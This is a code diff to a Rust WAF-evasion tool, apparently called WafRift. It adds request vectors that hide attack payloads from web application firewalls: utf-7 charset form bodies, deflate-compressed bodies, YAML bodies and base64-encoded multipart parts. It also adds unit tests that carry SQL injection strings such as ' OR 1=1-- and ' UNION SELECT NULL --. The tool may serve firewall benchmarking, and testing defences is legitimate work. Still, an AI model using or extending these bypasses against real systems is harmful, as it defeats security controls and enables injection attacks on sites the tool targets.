@@ -99,6 +99,31 @@ pub const VECTORS: &[Vector] = &[
     // backends (Python json, jsoniter, Go encoding/json) accept
     // any charset that decodes to valid UTF-8 octets.
     Vector { name: "POST-json-utf7", content_type: "application/json; charset=utf-7" },
+    // Symmetry vector — same charset trick on form bodies. WAFs
+    // that handled utf-7 JSON may NOT have plumbed the same gate
+    // through form-body inspection. Backends still decode form
+    // bytes as utf-8 regardless of the charset hint.
+    Vector { name: "POST-form-utf7", content_type: "application/x-www-form-urlencoded; charset=utf-7" },
+    // Raw deflate / RFC 1951 — ModSecurity's SecGzipDecompression
+    // directive handles gzip only. `Content-Encoding: deflate`
+    // bodies opaque to the inspection pipeline; origins handle
+    // deflate via their HTTP stack (nginx, Apache, IIS, hyper).
+    // The encoding crate's own doc-comment flags deflate as
+    // "irregular WAF support" — exploit it.
+    Vector { name: "POST-json-deflate", content_type: "application/json" },
+    Vector { name: "POST-form-deflate", content_type: "application/x-www-form-urlencoded" },
+    // YAML body — CRS has json/xml processors, NO yaml processor.
+    // Payload lives in the YAML scalar value position. Spring's
+    // YamlPropertySourceFactory, Rails's safe-load YAML, Express
+    // yaml middleware all parse `application/yaml` request bodies;
+    // ModSec's inspection layer treats them as opaque bytes.
+    Vector { name: "POST-yaml", content_type: "application/yaml" },
+    // Multipart with `Content-Transfer-Encoding: base64` on the
+    // attack part. WAFs that inspect multipart bodies see only the
+    // base64-encoded blob; MIME-compliant backends (multer, Spring
+    // MultipartResolver, ASP.NET, Python multipart) decode CTE
+    // automatically per RFC 2045 §6.8.
+    Vector { name: "POST-multipart-b64", content_type: "multipart/form-data" },
     // Duplicate-boundary multipart — two boundary strings, WAF
     // tracks one, origin tracks the other; the attack part is
     // visible only to the "wrong" one.
@@ -228,11 +253,11 @@ fn build_request_for_vector(
                     .body(body),
             )
         }
-        "POST-form-br" | "POST-form-gz" => {
-            let algo = if vector.name == "POST-form-br" {
-                CompressionAlgo::Brotli
-            } else {
-                CompressionAlgo::Gzip
+        "POST-form-br" | "POST-form-gz" | "POST-form-deflate" => {
+            let algo = match vector.name {
+                "POST-form-br" => CompressionAlgo::Brotli,
+                "POST-form-gz" => CompressionAlgo::Gzip,
+                _ => CompressionAlgo::Deflate,
             };
             let raw = format!("{param}={}", urlencoding::encode(payload));
             match compression::compress(raw.as_bytes(), algo) {
@@ -248,11 +273,11 @@ fn build_request_for_vector(
                 }
             }
         }
-        "POST-json-br" | "POST-json-gz" => {
-            let algo = if vector.name == "POST-json-br" {
-                CompressionAlgo::Brotli
-            } else {
-                CompressionAlgo::Gzip
+        "POST-json-br" | "POST-json-gz" | "POST-json-deflate" => {
+            let algo = match vector.name {
+                "POST-json-br" => CompressionAlgo::Brotli,
+                "POST-json-gz" => CompressionAlgo::Gzip,
+                _ => CompressionAlgo::Deflate,
             };
             let raw = serde_json::json!({ param: payload }).to_string();
             match compression::compress(raw.as_bytes(), algo) {
@@ -304,6 +329,43 @@ fn build_request_for_vector(
             // encoding/json, Java Jackson all accept).
             let raw = serde_json::json!({ param: payload }).to_string();
             Some(http.post(target).header("Content-Type", ct).body(raw))
+        }
+        "POST-form-utf7" => {
+            // Same charset-routing gap on the form-body axis.
+            let body = format!("{param}={}", urlencoding::encode(payload));
+            Some(http.post(target).header("Content-Type", ct).body(body))
+        }
+        "POST-yaml" => {
+            // YAML 1.2 §7.3.2 double-quoted scalars share JSON
+            // string escaping — `serde_json::Value::String(p).to_string()`
+            // emits exactly that surface. Backends parsing
+            // `application/yaml` (YAML 1.1+, all major libs)
+            // recover the payload byte-identical; WAFs without a
+            // YAML body processor see opaque bytes.
+            let escaped = serde_json::Value::String(payload.to_string()).to_string();
+            let body = format!("{param}: {escaped}\n");
+            Some(http.post(target).header("Content-Type", ct).body(body))
+        }
+        "POST-multipart-b64" => {
+            // Part-level `Content-Transfer-Encoding: base64` per
+            // RFC 2045 §6.8 — backend MIME parsers decode the
+            // base64 payload back into the field value; WAFs
+            // inspecting raw multipart bytes see only the encoded
+            // blob.
+            use base64::Engine as _;
+            let boundary = format!("----WafRiftB64Boundary{fire_counter:x}");
+            let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+            let body = format!(
+                "--{boundary}\r\nContent-Disposition: form-data; name=\"{param}\"\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--{boundary}--\r\n",
+            );
+            Some(
+                http.post(target)
+                    .header(
+                        "Content-Type",
+                        format!("multipart/form-data; boundary={boundary}"),
+                    )
+                    .body(body),
+            )
         }
         "POST-multipart-dupbound" => {
             // Two boundary strings declared (header lists one;
@@ -1523,5 +1585,463 @@ mod tests {
         // we can't directly inspect tags without successful fires.
         // The end-to-end assertion lives in scan/mod.rs integration
         // when bench runs against a real WAF.
+    }
+
+    // ── POST-form-utf7 ─────────────────────────────────────────
+
+    #[test]
+    fn build_post_form_utf7_declares_charset_in_content_type() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        assert!(ct.starts_with("application/x-www-form-urlencoded"));
+        assert!(ct.contains("charset=utf-7"));
+    }
+
+    #[test]
+    fn build_post_form_utf7_body_is_plain_url_encoded_form() {
+        // The lie is the charset header — the body stays utf-8
+        // url-encoded form so a lenient backend still parses it.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "value", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        assert_eq!(std::str::from_utf8(body).unwrap(), "q=value");
+    }
+
+    #[test]
+    fn build_post_form_utf7_url_encodes_special_chars() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "a&b=c", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("%26") && s.contains("%3D"));
+    }
+
+    #[test]
+    fn build_post_form_utf7_is_post_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-utf7").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "POST");
+    }
+
+    // ── POST-json-deflate ──────────────────────────────────────
+
+    #[test]
+    fn build_post_json_deflate_sets_content_encoding_deflate() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-encoding").unwrap(), "deflate");
+    }
+
+    #[test]
+    fn build_post_json_deflate_content_type_stays_application_json() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-type").unwrap(), "application/json");
+    }
+
+    #[test]
+    fn build_post_json_deflate_body_is_not_plaintext_json() {
+        // The point of compression-confusion: bytes on the wire
+        // must not be readable as JSON.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = String::from_utf8_lossy(body);
+        assert!(!s.contains("\"q\""), "compressed body must hide the param: {s}");
+    }
+
+    #[test]
+    fn build_post_json_deflate_round_trips_under_deflate_decompression() {
+        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let recovered = decompress(&CompressedBody {
+            body: body.to_vec(),
+            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
+        })
+        .expect("deflate round-trip");
+        let s = String::from_utf8(recovered).unwrap();
+        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
+        assert_eq!(v["q"], "abc");
+    }
+
+    #[test]
+    fn build_post_json_deflate_preserves_unicode_in_round_trip() {
+        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "café 中文 ' OR 1=1--", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let recovered = decompress(&CompressedBody {
+            body: body.to_vec(),
+            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
+        })
+        .unwrap();
+        let json: serde_json::Value =
+            serde_json::from_str(&String::from_utf8(recovered).unwrap()).unwrap();
+        assert_eq!(json["q"], "café 中文 ' OR 1=1--");
+    }
+
+    // ── POST-form-deflate ──────────────────────────────────────
+
+    #[test]
+    fn build_post_form_deflate_sets_content_encoding_deflate() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-encoding").unwrap(), "deflate");
+    }
+
+    #[test]
+    fn build_post_form_deflate_round_trips_under_deflate_decompression() {
+        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let recovered = decompress(&CompressedBody {
+            body: body.to_vec(),
+            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
+        })
+        .unwrap();
+        assert_eq!(String::from_utf8(recovered).unwrap(), "q=PAYLOAD");
+    }
+
+    #[test]
+    fn build_post_form_deflate_content_type_stays_form_urlencoded() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(
+            req.headers().get("content-type").unwrap(),
+            "application/x-www-form-urlencoded"
+        );
+    }
+
+    #[test]
+    fn build_post_form_deflate_body_hides_param_in_compressed_blob() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = String::from_utf8_lossy(body);
+        assert!(!s.contains("q=abc"), "compressed body still readable: {s}");
+    }
+
+    // ── POST-yaml ──────────────────────────────────────────────
+
+    #[test]
+    fn build_post_yaml_sets_application_yaml_content_type() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-type").unwrap(), "application/yaml");
+    }
+
+    #[test]
+    fn build_post_yaml_body_has_key_colon_value_shape() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "value", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.starts_with("q: "), "yaml must lead with key+colon: {s}");
+        assert!(s.contains("value"));
+    }
+
+    #[test]
+    fn build_post_yaml_uses_double_quoted_scalar_form() {
+        // Double-quoted YAML scalars accept JSON-style escapes and
+        // survive every payload byte. Anti-rig: a future refactor
+        // that switched to bare or single-quoted would break on
+        // payloads containing quotes / control chars.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("\"x\""), "must be double-quoted: {s}");
+    }
+
+    #[test]
+    fn build_post_yaml_escapes_double_quotes_in_payload() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "say \"hi\"", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        // The wire MUST escape the inner quotes; otherwise YAML
+        // parser would see `"say "hi""` and split early.
+        assert!(s.contains("\\\""), "inner quotes must escape: {s}");
+    }
+
+    #[test]
+    fn build_post_yaml_escapes_newlines_so_scalar_does_not_break() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "a\nb", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        // Raw newline would terminate the scalar early. The
+        // serializer must emit `\n` as the two-char escape.
+        assert!(s.contains("\\n"), "newline must be escaped: {s:?}");
+        // Exactly one trailing real newline (YAML doc terminator).
+        assert_eq!(s.matches('\n').count(), 1);
+    }
+
+    #[test]
+    fn build_post_yaml_empty_payload_emits_empty_quoted_scalar() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert_eq!(s, "q: \"\"\n");
+    }
+
+    #[test]
+    fn build_post_yaml_param_name_appears_as_root_key() {
+        for param in ["id", "user", "filter", "search"] {
+            let h = http();
+            let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
+            let req = build_request_for_vector(v, &h, "http://x/", param, "x", 0)
+                .unwrap()
+                .build()
+                .unwrap();
+            let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+            let s = std::str::from_utf8(body).unwrap();
+            assert!(s.starts_with(&format!("{param}: ")));
+        }
+    }
+
+    // ── POST-multipart-b64 ─────────────────────────────────────
+
+    #[test]
+    fn build_post_multipart_b64_content_type_includes_boundary() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0xFF)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        assert!(ct.starts_with("multipart/form-data; boundary="));
+        assert!(ct.contains("WafRiftB64Boundaryff"), "ct: {ct}");
+    }
+
+    #[test]
+    fn build_post_multipart_b64_part_has_base64_transfer_encoding() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("Content-Transfer-Encoding: base64"));
+    }
+
+    #[test]
+    fn build_post_multipart_b64_payload_decodes_back_to_original() {
+        use base64::Engine as _;
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let original = "' UNION SELECT NULL --";
+        let req = build_request_for_vector(v, &h, "http://x/", "q", original, 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        // The base64 line lives between the blank-line separator
+        // and the trailing `\r\n--<boundary>--`. Strip surrounding
+        // lines and decode.
+        let after_blank = s.split("\r\n\r\n").nth(1).expect("part body present");
+        let b64_line = after_blank.lines().next().unwrap().trim();
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(b64_line)
+            .expect("valid base64");
+        assert_eq!(std::str::from_utf8(&decoded).unwrap(), original);
+    }
+
+    #[test]
+    fn build_post_multipart_b64_raw_payload_is_NOT_present_on_wire() {
+        // Anti-rig: a refactor that accidentally fell through to
+        // the plaintext multipart shape would emit the raw payload
+        // (defeating the point of the vector).
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let attack = "UNION_SELECT_SECRET_TOKEN";
+        let req = build_request_for_vector(v, &h, "http://x/", "q", attack, 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(
+            !s.contains(attack),
+            "the raw attack string must be hidden behind base64: {s}"
+        );
+    }
+
+    #[test]
+    fn build_post_multipart_b64_part_name_matches_param() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "filter", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        assert!(s.contains("name=\"filter\""));
+    }
+
+    #[test]
+    fn build_post_multipart_b64_boundary_appears_in_body_and_header() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 7)
+            .unwrap()
+            .build()
+            .unwrap();
+        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let body_s = std::str::from_utf8(body).unwrap();
+        // The hex part of the boundary string from the header is
+        // present in the body too (open + close markers).
+        let bnd_marker = "WafRiftB64Boundary7";
+        assert!(ct.contains(bnd_marker));
+        assert_eq!(
+            body_s.matches(bnd_marker).count(),
+            2,
+            "expect open + close boundary lines: {body_s}"
+        );
+    }
+
+    #[test]
+    fn build_post_multipart_b64_with_non_ascii_payload_decodes_back_byte_identical() {
+        use base64::Engine as _;
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
+        let original = "café 中文 \0\x01\x02 bytes";
+        let req = build_request_for_vector(v, &h, "http://x/", "q", original, 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let after_blank = s.split("\r\n\r\n").nth(1).unwrap();
+        let b64_line = after_blank.lines().next().unwrap().trim();
+        let decoded = base64::engine::general_purpose::STANDARD
+            .decode(b64_line)
+            .unwrap();
+        assert_eq!(std::str::from_utf8(&decoded).unwrap(), original);
+    }
+
+    // ── catalogue presence ─────────────────────────────────────
+
+    #[test]
+    fn new_vectors_are_in_catalogue() {
+        // Defence: a refactor that dropped any of the new attack
+        // surfaces would silently regress the bench scoreboard.
+        let names: std::collections::HashSet<&str> =
+            VECTORS.iter().map(|v| v.name).collect();
+        for required in [
+            "POST-form-utf7",
+            "POST-json-deflate",
+            "POST-form-deflate",
+            "POST-yaml",
+            "POST-multipart-b64",
+        ] {
+            assert!(names.contains(required), "missing vector {required}");
+        }
+    }
+
+    #[test]
+    fn deflate_vectors_use_deflate_content_encoding_token() {
+        // Anti-rig: a future refactor that mapped Deflate → "gzip"
+        // would silently neuter the vector.
+        let h = http();
+        for name in ["POST-json-deflate", "POST-form-deflate"] {
+            let v = VECTORS.iter().find(|v| v.name == name).unwrap();
+            let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+                .unwrap()
+                .build()
+                .unwrap();
+            assert_eq!(
+                req.headers().get("content-encoding").unwrap(),
+                "deflate",
+                "{name} must send Content-Encoding: deflate"
+            );
+        }
     }
 }
